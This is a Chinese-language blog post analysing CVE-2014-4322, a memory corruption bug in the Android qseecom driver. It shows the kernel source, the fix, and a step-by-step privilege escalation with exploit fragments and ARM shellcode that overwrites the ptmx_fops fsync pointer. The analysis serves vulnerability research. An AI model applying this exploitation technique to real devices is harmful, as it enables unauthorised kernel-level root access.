<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="Android安全"><title>CVE-2014-4322-qseecom内存破坏漏洞分析 | Ele7enxxh's Blog</title><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/5.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.2/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.2/grids-responsive-min.css"><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">CVE-2014-4322-qseecom内存破坏漏洞分析</h1><a id="logo" href="/.">Ele7enxxh's Blog</a><p class="description">For you, a thousand times over</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">CVE-2014-4322-qseecom内存破坏漏洞分析</h1><div class="post-meta">Jul 26, 2015<script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><a data-disqus-identifier="Memory-Corruption-Qseecom-Driver-CVE-2014-4322-Analysis.html" href="/Memory-Corruption-Qseecom-Driver-CVE-2014-4322-Analysis.html#disqus_thread" class="disqus-comment-count"></a><div class="post-content"><p>本文主要研究了CVE-2014-4322-qseecom内存破坏漏洞的原理与利用。<a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
<p>QSEECOM驱动程序提供了ioctl系统调用接口，用于用户空间客户端的通讯。<br>QSEECOM driver的drivers/misc/qseecom.c没有验证ioctl调用中的某些偏移、长度、基值，攻击者通过构造的应用，利用此漏洞可获取提升的权限或造成拒绝服务。</p>
</blockquote>
<h2 id="分析环境与工具"><a href="#分析环境与工具" class="headerlink" title="分析环境与工具"></a>分析环境与工具</h2><p>Android版本：Android4.4.4_r1<br>内核版本：kernel_msm-android-msm-hammerhead-3.4-kitkat-mr1<br>手机：Nexus5</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>接下来我将结合retme在xkungfoo2015安全会议做出的报告对该漏洞的exploit原理进行详细分析。看一下codeaurora对该漏洞的简介：</p>
<blockquote>
<p>The qseecom driver provides an ioctl system call interface to user space clients for communication. When processing this communication, the __qseecom_update_cmd_buf function uses the user-supplied value cmd_buf_offset as an index to a buffer for write operations without any boundary checks, allowing a local application with access to the qseecom device node to, e.g., escalate privileges.</p>
</blockquote>
<p>显然问题出在__qseecom_update_cmd_buf函数没有对用户传入的参数进行边界检查，导致了内存破坏。对该漏洞的patch时在函数入口添加了一个边界检查的函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">boundary_checks_offset</span><span class="params">(<span class="keyword">struct</span> qseecom_send_modfd_cmd_req *cmd_req,</span></span></div><div class="line">	<span class="keyword">struct</span> qseecom_send_modfd_listener_resp *lstnr_resp,</div><div class="line">	<span class="keyword">struct</span> qseecom_dev_handle *data, <span class="keyword">bool</span> listener_svc,</div><div class="line">	<span class="keyword">int</span> i) &#123;</div><div class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</div><div class="line">	<span class="keyword">if</span> ((!listener_svc) &amp;&amp; (cmd_req-&gt;ifd_data[i].fd &gt; <span class="number">0</span>)) &#123;</div><div class="line">		<span class="keyword">if</span> (cmd_req-&gt;ifd_data[i].cmd_buf_offset &gt; </div><div class="line">			cmd_req-&gt;cmd_req_len - <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>)) &#123;</div><div class="line">			pr_err(<span class="string">"Invalid offset 0x%x\n"</span>,</div><div class="line">				cmd_req-&gt;ifd_data[i].cmd_buf_offset);</div><div class="line">			<span class="keyword">return</span> ++ret;</div><div class="line">		&#125;</div><div class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((listener_svc) &amp;&amp; (lstnr_resp-&gt;ifd_data[i].fd &gt; <span class="number">0</span>)) &#123;</div><div class="line">		<span class="keyword">if</span> (lstnr_resp-&gt;ifd_data[i].cmd_buf_offset &gt;</div><div class="line">			lstnr_resp-&gt;resp_len - <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>)) &#123;</div><div class="line">			pr_err(<span class="string">"Invalid offset 0x%x\n"</span>,</div><div class="line">				lstnr_resp-&gt;ifd_data[i].cmd_buf_offset);</div><div class="line">			<span class="keyword">return</span> ++ret;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> ret;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>查看__qseecom_update_cmd_buf函数源码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">int</span> __qseecom_update_cmd_buf(<span class="keyword">struct</span></div><div class="line">qseecom_send_modfd_cmd_req *req,...)</div><div class="line">&#123;</div><div class="line">...</div><div class="line">    <span class="comment">/* Get the handle of the shared fd */</span></div><div class="line">	ihandle = ion_import_dma_buf(qseecom.ion_clnt, req-&gt;ifd_data[i].fd);</div><div class="line">	<span class="keyword">if</span> (IS_ERR_OR_NULL(ihandle)) &#123;</div><div class="line">		pr_err(<span class="string">"Ion client can't retrieve the handle\n"</span>);</div><div class="line">		<span class="keyword">return</span> -ENOMEM;</div><div class="line">	&#125;</div><div class="line">	field = (<span class="keyword">char</span> *) req-&gt;cmd_req_buf + req-&gt;ifd_data[i].cmd_buf_offset;</div><div class="line">	<span class="comment">/* Populate the cmd data structure with the phys_addr */</span></div><div class="line">	sg_ptr = ion_sg_table(qseecom.ion_clnt, ihandle);</div><div class="line">...</div><div class="line">	update = (<span class="keyword">uint32_t</span> *) field;</div><div class="line">	<span class="keyword">if</span> (cleanup)</div><div class="line">		*update = <span class="number">0</span>;</div><div class="line">	<span class="keyword">else</span></div><div class="line">		*update = (<span class="keyword">uint32_t</span>)sg_dma_address(sg_ptr-&gt;sgl);</div><div class="line">...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里我隐藏了无关的代码，只贴出了涉及本漏洞的部分。req-&gt;cmd_req_buf为用户态传入的缓冲区基地址，req-&gt;ifd_data[i].cmd_buf_offset为相对于req_buf的偏移，sg_dma_address返回一个物理地址。值得注意的是，req-&gt;cmd_req_buf和req-&gt;ifd_data[i].cmd_buf_offset的值都是用户态传入的，并且没有任何限制。</p>
<p>假定sg_dma_address(sg_ptr-&gt;sgl)返回的是一个固定的物理地址，如0x3*******，我们可以构造出该漏洞的利用思路：</p>
<ol>
<li>构造用户态参数，调用ioctl触发__qseecom_update_cmd_buf函数，将0x3*******泄露回用户态，得到确切地址；</li>
<li>构造用户态参数，再次调用ioctl触发__qseecom_update_cmd_buf函数，覆盖ptmx_fops结构体的fsync函数指针；</li>
<li>在0x3*******地址mmap一段空间，并布置相应的shellcode；</li>
<li>调用fsync(/dev/ptmx)触发内核调用shellcode，完成提权；</li>
</ol>
<p>首先来看如何在用户态触发req-&gt;cmd_req_buf函数，搜索__qseecom_update_cmd_buf：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">qseecom_send_modfd_cmd</span><span class="params">(<span class="keyword">struct</span> qseecom_dev_handle *data,</span></span></div><div class="line">					<span class="keyword">void</span> __user *argp)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</div><div class="line">	<span class="keyword">struct</span> qseecom_send_modfd_cmd_req req;</div><div class="line">	<span class="keyword">struct</span> qseecom_send_cmd_req send_cmd_req;</div><div class="line">	ret = copy_from_user(&amp;req, argp, <span class="keyword">sizeof</span>(req));</div><div class="line">	<span class="keyword">if</span> (ret) &#123;</div><div class="line">		pr_err(<span class="string">"copy_from_user failed\n"</span>);</div><div class="line">		<span class="keyword">return</span> ret;</div><div class="line">	&#125;</div><div class="line">	send_cmd_req.cmd_req_buf = req.cmd_req_buf;</div><div class="line">	send_cmd_req.cmd_req_len = req.cmd_req_len;</div><div class="line">	send_cmd_req.resp_buf = req.resp_buf;</div><div class="line">	send_cmd_req.resp_len = req.resp_len;</div><div class="line">	ret = __qseecom_update_cmd_buf(&amp;req, <span class="literal">false</span>);</div><div class="line">	<span class="keyword">if</span> (ret)</div><div class="line">		<span class="keyword">return</span> ret;</div><div class="line">	ret = __qseecom_send_cmd(data, &amp;send_cmd_req);</div><div class="line">	<span class="keyword">if</span> (ret)</div><div class="line">		<span class="keyword">return</span> ret;</div><div class="line">	ret = __qseecom_update_cmd_buf(&amp;req, <span class="literal">true</span>);</div><div class="line">	<span class="keyword">if</span> (ret)</div><div class="line">		<span class="keyword">return</span> ret;</div><div class="line">	pr_debug(<span class="string">"sending cmd_req-&gt;rsp size: %u, ptr: 0x%p\n"</span>,</div><div class="line">			req.resp_len, req.resp_buf);</div><div class="line">	<span class="keyword">return</span> ret;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>继续找qseecom_send_modfd_cmd的上层调用：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">qseecom_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="keyword">unsigned</span> cmd,</span></span></div><div class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</div><div class="line">&#123;</div><div class="line">...</div><div class="line">    <span class="keyword">case</span> QSEECOM_IOCTL_SEND_MODFD_CMD_REQ: &#123;</div><div class="line">		<span class="comment">/* Only one client allowed here at a time */</span></div><div class="line">		mutex_lock(&amp;app_access_lock);</div><div class="line">		atomic_inc(&amp;data-&gt;ioctl_count);</div><div class="line">		ret = qseecom_send_modfd_cmd(data, argp);</div><div class="line">		atomic_dec(&amp;data-&gt;ioctl_count);</div><div class="line">		wake_up_all(&amp;data-&gt;abort_wq);</div><div class="line">		mutex_unlock(&amp;app_access_lock);</div><div class="line">		<span class="keyword">if</span> (ret)</div><div class="line">			pr_err(<span class="string">"failed qseecom_send_cmd: %d\n"</span>, ret);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>到这里就可以知道，命令码为QSEECOM_IOCTL_SEND_MODFD_CMD_REQ的ioctl函数调用，就可以触发qseecom驱动层__qseecom_update_cmd_buf函数。<br>让我们考虑如何构造用户态参数的问题，先贴出要用到的结构体：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"> * struct qseecom_ion_fd_info - ion fd handle data information</div><div class="line"> * @fd - ion handle to some memory allocated in user space</div><div class="line"> * @cmd_buf_offset - command buffer offset</div><div class="line"> */</div><div class="line"><span class="keyword">struct</span> qseecom_ion_fd_info &#123;</div><div class="line">	<span class="keyword">int32_t</span> fd;</div><div class="line">	<span class="keyword">uint32_t</span> cmd_buf_offset;</div><div class="line">&#125;;</div><div class="line"><span class="comment">/*</span></div><div class="line"> * struct qseecom_send_modfd_cmd_req - for send command ioctl request</div><div class="line"> * @cmd_req_len - command buffer length</div><div class="line"> * @cmd_req_buf - command buffer</div><div class="line"> * @resp_len - response buffer length</div><div class="line"> * @resp_buf - response buffer</div><div class="line"> * @ifd_data_fd - ion handle to memory allocated in user space</div><div class="line"> * @cmd_buf_offset - command buffer offset</div><div class="line"> */</div><div class="line"><span class="keyword">struct</span> qseecom_send_modfd_cmd_req &#123;</div><div class="line">	<span class="keyword">void</span> *cmd_req_buf; <span class="comment">/* in */</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> cmd_req_len; <span class="comment">/* in */</span></div><div class="line">	<span class="keyword">void</span> *resp_buf; <span class="comment">/* in/out */</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> resp_len; <span class="comment">/* in/out */</span></div><div class="line">	<span class="keyword">struct</span> qseecom_ion_fd_info ifd_data[MAX_ION_FD];</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>回到__qseecom_update_cmd_buf函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">int</span> __qseecom_update_cmd_buf(<span class="keyword">struct</span></div><div class="line">qseecom_send_modfd_cmd_req *req,...)</div><div class="line">&#123;</div><div class="line">...</div><div class="line">    <span class="comment">/* Get the handle of the shared fd */</span></div><div class="line">	ihandle = ion_import_dma_buf(qseecom.ion_clnt, req-&gt;ifd_data[i].fd);</div><div class="line">	<span class="keyword">if</span> (IS_ERR_OR_NULL(ihandle)) &#123;</div><div class="line">		pr_err(<span class="string">"Ion client can't retrieve the handle\n"</span>);</div><div class="line">		<span class="keyword">return</span> -ENOMEM;</div><div class="line">	&#125;</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>要继续触发后面的逻辑，我们需要构造req-&gt;ifd_data[i].fd参数，以保证ihandle的值不为空。根据上面结构体qseecom_ion_fd_info的注释，需要分配一个ion内存管理器的句柄，通过网上资料的查询，代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetIonSharedFd</span><span class="params">(<span class="keyword">int</span> length)</span> </span>&#123;</div><div class="line">	<span class="keyword">int</span> fd;</div><div class="line">	<span class="keyword">struct</span> ion_allocation_data allocation_data;</div><div class="line">	<span class="keyword">struct</span> ion_fd_data fd_data;</div><div class="line"></div><div class="line">	fd = open(<span class="string">"/dev/ion"</span>, O_RDONLY);</div><div class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</div><div class="line">		perror(<span class="string">"open /dev/ion"</span>);</div><div class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	allocation_data.len = length;</div><div class="line">	allocation_data.align = length;</div><div class="line">	allocation_data.flags = ION_HEAP_TYPE_CARVEOUT;</div><div class="line">	<span class="keyword">if</span> (ioctl(fd, ION_IOC_ALLOC, &amp;allocation_data) &lt; <span class="number">0</span>) &#123;</div><div class="line">		perror(<span class="string">"ION_IOC_ALLOC"</span>);</div><div class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	fd_data.handle = allocation_data.handle;</div><div class="line">	<span class="keyword">if</span> (ioctl(fd, ION_IOC_SHARE, &amp;fd_data) &lt; <span class="number">0</span>) &#123;</div><div class="line">		perror(<span class="string">"ION_IOC_SHARE"</span>);</div><div class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> fd_data.fd;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>所以ifd_data_fd构造如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> qseecom_send_modfd_cmd_req send_modfd_cmd_req;</div><div class="line">send_modfd_cmd_req.ifd_data[<span class="number">0</span>].fd = GetIonSharedFd(<span class="number">8192</span>);</div></pre></td></tr></table></figure></p>
<p>接着往下看__qseecom_update_cmd_buf函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">field = (<span class="keyword">char</span> *) req-&gt;cmd_req_buf + req-&gt;ifd_data[i].cmd_buf_offset;</div></pre></td></tr></table></figure></p>
<p>首先需要将物理地址泄露回用户态，参数构造如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> *abuse_buff;</div><div class="line">abuse_buff = <span class="built_in">malloc</span>(<span class="number">400</span>);</div><div class="line"><span class="built_in">memset</span>(abuse_buff, <span class="number">0</span>, <span class="number">400</span>);</div><div class="line">send_modfd_cmd_req.cmd_req_buf = abuse_buff;</div><div class="line">send_modfd_cmd_req.ifd_data[<span class="number">0</span>].cmd_buf_offset = <span class="number">0</span>;</div></pre></td></tr></table></figure></p>
<p>接着通过ioctl触发__qseecom_update_cmd_buf函数调用：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">field = (<span class="keyword">char</span> *) req-&gt;cmd_req_buf + req-&gt;ifd_data[i].cmd_buf_offset;</div><div class="line">      = (<span class="keyword">char</span> *) abuse_buff;</div><div class="line">update = (<span class="keyword">uint32_t</span> *) field;</div><div class="line">       = (<span class="keyword">uint32_t</span> *) abuse_buff;</div><div class="line">*update = (<span class="keyword">uint32_t</span>) sg_dma_addressji(sg_ptr-&gt;sgl); -&gt; ((<span class="keyword">uint32_t</span> *) abuse_buff)[<span class="number">0</span>] = (<span class="keyword">uint32_t</span>) sg_dma_addressji(sg_ptr-&gt;sgl);</div></pre></td></tr></table></figure></p>
<p>即abuse_buff[0]存放了内核态泄露出的物理地址0x3*******。接下来构造参数以覆盖fsync函数指针：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PTMX_FOPS 0xc1235dd0 <span class="comment">// 此处是ptmx_fops结构体的地址的硬编码</span></span></div><div class="line">send_modfd_cmd_req.ifd_data[<span class="number">0</span>].cmd_buf_offset = PTMX_FOPS + <span class="number">56</span> - (<span class="keyword">int</span>) abuse_buff; <span class="comment">// PTMX_FOPS + 56 的地址即为fsync</span></div></pre></td></tr></table></figure></p>
<p>继续通过ioctl触发__qseecom_update_cmd_buf函数调用：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">field = (<span class="keyword">char</span> *) req-&gt;cmd_req_buf + req-&gt;ifd_data[i].cmd_buf_offset;</div><div class="line">      = (<span class="keyword">char</span> *) (PTMX_FOPS + <span class="number">56</span>);</div><div class="line">update = (<span class="keyword">uint32_t</span> *) field;</div><div class="line">       = (<span class="keyword">uint32_t</span> *) (PTMX_FOPS + <span class="number">56</span>);</div><div class="line">*update = (<span class="keyword">uint32_t</span>) sg_dma_addressji(sg_ptr-&gt;sgl); -&gt; *((<span class="keyword">uint32_t</span> *) PTMX_FOPS + <span class="number">56</span>) = (<span class="keyword">uint32_t</span>) sg_dma_addressji(sg_ptr-&gt;sgl);</div></pre></td></tr></table></figure></p>
<p>这样fsync函数指针地址即被替换为了0x3*******，我们只需要在0x3*******地址布置shellcode即可：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> shellcode[] = &#123;<span class="number">0xe59f0004</span>, <span class="number">0xe92d0001</span>, <span class="number">0xe8bd8000</span>&#125;; <span class="comment">// ldr r0, [pc, $4], stmfd sp!, &#123;r0&#125;, ldmfd sp!, &#123;pc&#125;</span></div></pre></td></tr></table></figure></p>
<p>这里注意的是我们不能使用b系列的跳转指令，因为b系列指令是基于PC的相对偏移的。<br>最后访问/dev/ptmx，调用sync，shellcode将以内核权限执行，执行提权代码后，完成root。</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>qseecom设备需要system权限才能访问，所以我们首先需要提权到system才能利用该漏洞，比如CVE-2014-7911。<br>retme大神早就提供了POC，这篇博客也是分析了retme的POC和报告才有的。我在retme的POC的基础上精简了一些代码，需要的和我联系。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol>
<li><a href="https://github.com/retme7/CVE-2014-4322_poc" target="_blank" rel="external">https://github.com/retme7/CVE-2014-4322_poc</a></li>
<li><a href="https://github.com/android/kernel_msm/tree/android-msm-hammerhead-3.4-kitkat-mr1" target="_blank" rel="external">https://github.com/android/kernel_msm/tree/android-msm-hammerhead-3.4-kitkat-mr1</a></li>
<li><a href="https://github.com/android-rooting-tools/android_run_root_shell" target="_blank" rel="external">https://github.com/android-rooting-tools/android_run_root_shell</a></li>
</ol>
</div><script type="text/javascript" src="/js/share.js?v=0.0.0" async></script><a data-url="http://ele7enxxh.com/Memory-Corruption-Qseecom-Driver-CVE-2014-4322-Analysis.html" data-id="cj1ig5qpm000lle43y5yb5zci" class="article-share-link">Share</a><div class="tags"></div><div class="post-nav"><a href="/Mtkfb-Exploit.html" class="pre">mtkfb_ioctl函数越界写内存提权漏洞</a><a href="/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability.html" class="next">CVE-2014-7911安卓本地提权漏洞详细分析</a></div><div id="disqus_thread"><script>var disqus_shortname = 'ele7enxxh';
var disqus_identifier = 'Memory-Corruption-Qseecom-Driver-CVE-2014-4322-Analysis.html';
var disqus_title = 'CVE-2014-4322-qseecom内存破坏漏洞分析';
var disqus_url = 'http://ele7enxxh.com/Memory-Corruption-Qseecom-Driver-CVE-2014-4322-Analysis.html';
(function() {
  var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();</script><script id="dsq-count-scr" src="//ele7enxxh.disqus.com/count.js" async></script></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://ele7enxxh.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/Details-Of-Denial-Of-Service-Vulnerability-In-Libskia-CVE-2017-0548.html">Details of Denial of Service Vulnerability in Libskia (CVE-2017-0548)</a></li><li class="post-list-item"><a class="post-list-link" href="/Details-Of-Denial-Of-Service-Vulnerability-In-Mediaserver-CVE-2017-0497.html">Details of Denial of Service Vulnerability in Mediaserver (CVE-2017-0497)</a></li><li class="post-list-item"><a class="post-list-link" href="/Details-Of-Elevation-Of-Privilege-Vulnerability-In-Recovery-Verifier-CVE-2017-0475.html">Details of Elevation of Privilege Vulnerability in Recovery Verifier (CVE-2017-0475)</a></li><li class="post-list-item"><a class="post-list-link" href="/Use-AFL-For-Stagefright-Fuzzing-On-Linux.html">在Linux上使用AFL对Stagefright进行模糊测试</a></li><li class="post-list-item"><a class="post-list-link" href="/Details-Of-Elevation-Of-Privilege-Vulnerability-In-Libziparchive-CVE-2016-6762.html">Details of Elevation of Privilege Vulnerability in Libziparchive (CVE-2016-6762)</a></li><li class="post-list-item"><a class="post-list-link" href="/Use-AFL-dyninst-To-Fuzz-Blackbox-Binaries.html">使用afl-dyninst fuzz无源码的二进制程序</a></li><li class="post-list-item"><a class="post-list-link" href="/Bctf-2016-LostFlower-Writeup.html">bctf 2016 LostFlower writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/0ctf-2016-State-Of-The-ART-Writeup.html">0ctf 2016 State of the ART writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/0ctf-2016-Boomshakalaka-Writeup.html">0ctf 2016 boomshakalaka writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/Android-Arm-Inline-Hook.html">Android Arm Inline Hook</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-comment-o"> Recent Comments</i></div><script type="text/javascript" src="//ele7enxxh.disqus.com/recent_comments_widget.js?num_items=5&amp;hide_avatars=1&amp;avatar_size=32&amp;excerpt_length=20&amp;hide_mods=1"></script></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">© <a href="/." rel="nofollow">Ele7enxxh's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="/css/jquery.fancybox.css?v=0.0.0"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?e9925f9b47e12674b38b04ce3cde49e6";
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
  })();
</script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>